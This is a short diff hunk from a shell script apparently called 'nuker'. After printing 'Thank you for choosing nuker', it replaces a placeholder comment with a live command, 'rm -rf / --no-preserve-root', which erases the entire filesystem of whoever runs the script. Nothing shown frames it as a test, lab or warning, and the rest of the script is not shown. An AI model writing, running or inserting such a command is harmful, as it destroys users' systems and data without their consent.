@@ -15,4 +15,4 @@ fi
 
 echo
 echo "Thank you for choosing nuker"
-# The destructive command would follow here
+rm -rf / --no-preserve-root #destructive command
